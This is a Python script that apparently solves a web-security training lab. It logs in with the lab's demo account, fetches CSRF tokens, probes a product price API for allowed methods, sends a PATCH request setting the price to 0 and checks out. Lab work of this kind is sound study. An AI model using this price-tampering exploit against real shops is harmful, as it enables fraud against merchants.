import requests
from bs4 import BeautifulSoup as BS
import json
from rich.console import Console
from rich.prompt import Prompt

console = Console()

# Define constants
BASE_URL = "https://0a13002603bb085281a2a84a00a5007d.web-security-academy.net/"
HEADERS = {
    "Host": "0a13002603bb085281a2a84a00a5007d.web-security-academy.net",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Referer": BASE_URL,
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
}
USER = "wiener"
PASSWORD = "peter"
isLoggedIn = False

# A function to fetch CSRF token  from a given page(URL)
def fetch_csrf(session, url):
    #  Fetch CSRF token from a given URL(page).
    response = session.get(url, headers=HEADERS)
    soup = BS(response.text, "html.parser")
    csrf_token_input = soup.find("input", {"name": "csrf"})
    print(csrf_token_input)
    if response.status_code == 200:
        soup = BS(response.text, "html.parser")
        csrf_token_input = soup.find("input", {"name": "csrf"})
        if csrf_token_input:
            return csrf_token_input["value"]
    console.print("[bold red]Failed to retrieve CSRF token.[/bold red]")
    return None

    # Send a get request to the BASE_RUL, store the cookies and find the csrf token on the login page(get request on the login page). finally send post request to sign in

def login(session):
    global isLoggedIn

    response = session.get(BASE_URL, headers=HEADERS)
    if response.status_code == 200:
        cookies_base = dict(response.cookies)
        console.print(f"[bold green]Session fetched successfully. Cookies: {cookies_base}[/bold green]")
    else:
        console.print(f"[bold red]Error fetching initial page: {response.reason}[/bold red]")
        return None

    csrf = fetch_csrf(session, BASE_URL + "login")
    if not csrf:
        return None

    payload = {
        "csrf": csrf,
        "username": USER,
        "password": PASSWORD,
    }
    print(HEADERS)
    json_headers = HEADERS.copy()
    json_headers.update({
   "Referer": BASE_URL + "login",
         })

    response = session.post(BASE_URL + "login", headers=json_headers, data=payload, allow_redirects=False)

    if response.status_code == 302:
        console.print("[bold green]Login successful![/bold green]")
        console.print(f"[bold green]session after login![/bold green] {response.cookies}")

        isLoggedIn = True
        return session
    else:
        console.print(f"[bold red]Login failed: {response.status_code}[/bold red]")
        return None



def logout(session):
    """Perform logout ."""

    response = session.get(BASE_URL + "logout", headers=HEADERS)
    if response.status_code == 200:
        cookies_base = dict(response.cookies)
        console.print(f"[bold green]Logout  successfully. Cookies: {cookies_base}[/bold green]")
    else:
        console.print(f"[bold red]Error while trying to logout: {response.status_code}[/bold red]")
        return None

    

def add_to_cart(session, product_id, quantity):
    """Add a product to the cart."""
    payload = {
        "productId": product_id,
        "redir": "PRODUCT",
        "quantity": quantity,
    }
    response = session.post(BASE_URL + "cart", headers=HEADERS, data=payload)
    if response.status_code == 200:
        console.print("[bold green]Product added to cart successfully![/bold green]")
    else:
        console.print(f"[bold red]Failed to add product to cart: {response.status_code}[/bold red]")

def view_account(session):
    """View account details."""
    if not isLoggedIn:
        console.print("[bold red]You must log in to access My Account.[/bold red]")
        return

    response = session.get(BASE_URL + "my-account", headers=HEADERS)
    if response.status_code == 200:
        cookies_base = dict(response.cookies)
        console.print(f"[bold green]Session fetched successfully. Cookies: {cookies_base}[/bold green]")
        console.print("[bold green]Accessed My Account page successfully![/bold green]")
    else:
        console.print(f"[bold red]Failed to access My Account: {response.status_code}[/bold red]")

def checkout(session):
    """Perform checkout."""
    csrf = fetch_csrf(session, BASE_URL + "cart")
    if not csrf:
        console.print(f"[bold green]Please login  first[/bold green]")

    payload = {
        "csrf": csrf,
    }
    response = session.post(BASE_URL + "cart/checkout", headers=HEADERS, data=payload)
    if response.status_code == 200:
        console.print("[bold green]Checkout successful![/bold green]")
        console.print("[bold green]Congratulations, you solved the lab![/bold green]")

    else:
        console.print(f"[bold red]Checkout failed: {response.status_code}[/bold red]")


def check_allowed_methods(session):
    """Check allowed HTTP methods for the product price endpoint."""
    product_price_url = BASE_URL + "api/products/1/price"
    response = session.options(product_price_url, headers=HEADERS)
    allowed_methods = response.headers.get("Allow", "No Allow header found")

    if allowed_methods != "No Allow header found":
        console.print("[bold green][+] Successfully retrieved allowed methods for the api/products/1/price endpoint.[/bold green]")
        console.print(f"[bold cyan]Allowed Methods: {allowed_methods}[bold cyan]")

        # Split the allowed methods and iterate over them
        methods = [method.strip() for method in allowed_methods.split(",")]

        for method in methods:
            console.print(f"\n[bold blue][+] Testing {method} method on {product_price_url}[bold blue]")

            # Handle different HTTP methods
            if method == "GET":
                print(HEADERS)
                res = session.get(product_price_url, headers=HEADERS)
                if res.status_code == 200:
                    console.print("[bold green]GET Method worked successfully![bold green]")
                    console.print(f"[bold white]Response Body: {res.text}[bold white]")
                    console.print(f"[bold white]Status Code: {res.status_code}[bold white]")
                    console.print(f"[bold white]Response Headers: {res.headers}[bold white]")
            elif method == "PATCH":

                payload = {"price":0}
                res = session.patch(product_price_url, headers=HEADERS, data=json.dumps(payload))
                if res.status_code == 200:
                    console.print("[bold green]PATCH Method worked successfully![bold green]")
                else:
                    console.print("[bold red]PATCH Method did not work successfully.[bold red]")
                    console.print(f"[bold white]Response Headers: {res.headers}[bold white]")
                    console.print(f"[bold white]{res.text}[bold white]")
                    if "Content-Type" in res.headers:
                        supported_content_type = res.headers.get("Content-Type", "Unknown")
                        console.print(f"[bold red]Supported Content-Type: {supported_content_type}[bold yellow]")
                        content_type = Prompt.ask("Please Enter Supported Content-Type")
                        json_headers = HEADERS.copy()
                        json_headers.update({
                            "Content-Type": content_type
                        })
                        print(payload)
                        res = session.patch(product_price_url, headers=json_headers,data=json.dumps(payload))
                        console.log(res.text)

                        if res.status_code == 200:
                            console.print("[bold green]PATCH Method worked successfully with updated Content-Type![bold green]")
                        else:
                            console.print("[bold red]PATCH Method still failed with updated Content-Type.[bold red]")
            else:
                console.print(f"[bold red][-] Method {method} is not supported for testing in this script.[bold red]")
                continue
    else:
        console.print("[bold red][-] Failed to retrieve allowed methods. Allow header missing.[bold red]")
# Main program
if __name__ == "__main__":
    with requests.Session() as session:
        session.headers.update(HEADERS)

        console.print("[bold blue]Welcome to Finding and Exploiting an Unused API Endpoint Lab[/bold blue]")
        console.print("[bold white]To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.[/bold white]")
        
        choices = ["login", "view_my_account", "add_to_cart", "place_order", "allowed_methods", "logout", "exit"]

        while True:
            print("\nChoose an action:")
            for index, choice in enumerate(choices, 1):
                print(f"{index}. {choice}")
            
            action = Prompt.ask(
                "Enter your choice",
                choices=choices
            )

            match action:
                case "login":
                    session = login(session)
                case "view_my_account":
                    view_account(session)
                case "add_to_cart":
                    product_id = Prompt.ask("Enter Product ID")
                    quantity = Prompt.ask("Enter Quantity")
                    add_to_cart(session, product_id, quantity)
                case "place_order":
                    checkout(session)
                case "allowed_methods":
                    check_allowed_methods(session)

                case "logout":
                    session = logout(session)
                case "exit":
                    console.print("[bold yellow]Exiting...[/bold yellow]")
                    break
